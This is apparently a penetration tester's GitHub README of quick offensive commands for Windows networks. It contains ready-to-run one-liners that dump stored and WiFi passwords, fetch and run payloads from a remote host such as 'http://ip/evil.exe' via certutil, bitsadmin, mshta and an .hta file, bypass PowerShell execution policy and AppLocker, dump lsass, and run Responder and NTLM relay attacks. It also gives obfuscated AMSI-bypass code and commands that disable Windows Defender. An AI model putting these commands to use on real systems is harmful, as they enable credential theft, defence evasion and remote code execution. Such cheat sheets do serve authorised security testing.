[PORTSCAN]()<br />
[Powershell-execution-bypass-techniques](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#powershell-execution-bypass-techniques)<br />
[GPO Applocker Bypass](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#bypass-gpo-and-applocker-to-execute-powershell)<br />
[Poisoning-attack](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#poisoning-attack)<br />
[AMSI Bypass]()<br />
## Portscan
#### Nmap Few
```
nmap -sS -Pn -p 22,25,80,443,139,445,3306,1433,5432,1521,27001,8080,8000,8088,8443,5900,1099 --open -vvvv -iL <file> -oA nmap_few
```
#### Nmap 1k
```
nmap -sS -Pn --open -vvvv -iL <file> -oA nmap_1k
```
#### Masscan + nmap version Full
```
masscan -p 1-65535 --rate 10000 --wait 0 --open -iL ip.txt -oX masscan.xml
```
```
open_ports=$(cat masscan.xml | grep portid | cut -d "\"" -f 10 | sort -n | uniq | paste -sd,)
```
```
nmap -sS -Pn -A -sV -p $open_ports --open -vvvv -n -iL ip.txt -oA nmapfull
```
#### Naabu
```
naabu -list <ip.txt> -rate 5000 -nmap-cli 'nmap -sV -oA naabu_nmap'
```

## PowerShell Enumeration Commands 
Reference : https://www.infosecmatter.com/powershell-commands-for-pentesters/ 
#### Find sensitive info
```
Get-ChildItem c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts*,*sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
```
#### Find Password string in files
```
Get-ChildItem c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
```
#### Dump Passwords from Windows Password Vault
```
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
```
#### Dump Passwords from Windows Credential Manager
```
Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }
```
#### Dump WiFi Passwords
```
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```
#### Dump Auto-Logon Credentials
```
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"
```
#### Enable RDP
```
(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
```
#### Allow RDP on Firewall
```
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
```
#### Port Sweep
```
$port = 22
$net = "10.10.0."
0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null
```
#### Fileless Download
```
iex(iwr("https://URL"))
```
#### List Installed Antivirus
```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```
#### Check if system is part of Domain
```
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
```
#### 
#### File Download Technique 1
```
Invoke-WebRequest -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
```
```
wget -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
```
```
curl -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
```
```
iwr -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
```
```
Invoke-RestMethod -Uri "http://ip/evil.exe" -OutFile "C:\evil.exe"
```
```
Import-Module BitsTransfer
Start-BitsTransfer -source "http://ip/evil.exe" -destination "evil.exe"
```
```
certutil.exe -urlcache -split -f http://ip/evil.exe evil.exe
```
```
mshta http://ip/evil.exe
```
```
bitsadmin /transfer test /download /priority high http://ip/evil.exe C:\evil.exe
```

## PowerShell Execution Bypass Techniques

#### Netspi blog - https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
```
powershell.exe -ExecutionPolicy Bypass
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA

Set-ExecutionPolicy Bypass -Scope Process
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
Get-Content .runme.ps1 | Invoke-Expression
GC .runme.ps1 | iex
TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.0.1/exploit.ps1')"
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
Powershell -c "Write-Host 'My voice is my passport, verify me.'"
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1

```

## Bypass GPO and Applocker to execute Powershell

#### Powershx
```
https://github.com/iomoath/PowerShx
```

#### MSBuildshell
Download
```
https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj
```
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
Or
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
#### CScriptShell
```
https://github.com/Cn33liz/CScriptShell
```
#### Powershdll
```
https://github.com/p3nt4/PowerShdll
```
#### SyncAppvPublishingServer
```
SyncAppvPublishingServer.vbs "Break; mshta <remote file>"
```
#### Powerline
```
https://github.com/fullmetalcache/PowerLine
```
```
PowerLine.exe Out-Minidump "Get-Process lsass | Out-Minidump"
```
```
PowerLine.exe PowerUp "Invoke-AllChecks"
```
#### List AppLocker Rules - https://blog.pwn.al/security/applocker/bypass/custom/rules/windows/2018/09/13/applocker-custom-rules-bypass.html
```
Import-Module AppLocker
[xml]$data = Get-AppLockerPolicy -effective -xml

# Extracts All Rules and print them.
Write-Output "[+] Printing Applocker Rules [+]`n"
($data.AppLockerPolicy.RuleCollection | ? { $_.EnforcementMode -match "Enabled" }) | ForEach-Object -Process {
    Write-Output ($_.FilePathRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Path Rule ===`n`n Rule Name : $($_.Name) `n Condition : $($_.Conditions.FilePathCondition.Path)`n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
    Write-Output ($_.FileHashRule) | ForEach-Object -Process { Write-Output "=== File Hash Rule ===`n`n Rule Name : $($_.Name) `n File Name :  $($_.Conditions.FileHashCondition.FileHash.SourceFileName) `n Hash type : $($_.Conditions.FileHashCondition.FileHash.Type) `n Hash :  $($_.Conditions.FileHashCondition.FileHash.Data) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
    Write-Output ($_.FilePublisherRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Publisher Rule ===`n`n Rule Name : $($_.Name) `n PublisherName : $($_.Conditions.FilePublisherCondition.PublisherName) `n ProductName : $($_.Conditions.FilePublisherCondition.ProductName) `n BinaryName : $($_.Conditions.FilePublisherCondition.BinaryName) `n BinaryVersion Min. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection) `n BinaryVersion Max. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
}
```
#### .hta payload
```
<HTML> 
<HEAD> 
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"
</script>
</HEAD> 
<BODY> 
</BODY> 
</HTML>
```
#### Whitelist Invasion - Installutil.py
```
https://github.com/khr0x40sh/WhiteListEvasion
```
#### Cmd.exe dll
```
https://github.com/DidierStevens/DidierStevensSuite/blob/master/cmd.dll
```
#### P0wned shell
```
https://github.com/Cn33liz/p0wnedShell
```
#### Mini Powershell
```
https://github.com/InfosecMatter/Shells-for-restricted-environments
```
## Poisoning Attack

#### Responder
```
responder -I eth0
```
#### IPv6 DHCP Rogue Server 
Install Mitm6
```
pip install mitm6
```

```
mitm6 -i eth0
```

#### Generate SMB Signing Disabled Hosts
```
crackmapexec smb --gen-relay-list smb_sigb_disabled.txt ranges.txt
```
#### Relay Attacks 
ntlmrelayx
```
python3 ntlmrelayx.py -smb2support -tf filename
```
ntlmrelayx Comamnd execution
```
python3 ntlmrelayx.py -smb2support -tf filename -c <msf or koadic listener here>
```
Multirelay
```
python3 MultiRelay.py -t IP -u ALL
```
SMBrelay
```
python3 smbrelayx.py -h IP -c <command>
```
```
python3 smbrelayx.py -h IP -e <executable>
```


## AMSI Bypass References
#### https://amsi.fail/
```
https://amsi.fail/
```
#### Matt Graeber Techniques 
``` 
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);Invoke-Expression (New-Object Net.WebClient).DownloadString('http://ip/xyz.ps1');Invoke-xyz
```
#### Matt Graeber Techniques 
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
#### https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
```
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
```
#### Technique
```
[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
```
## Disable Monitoring/Windefend
```
Set-MpPreference -DisableRealtimeMonitoring $true
```
```
sc config WinDefend start= disabled
sc stop WinDefend
```
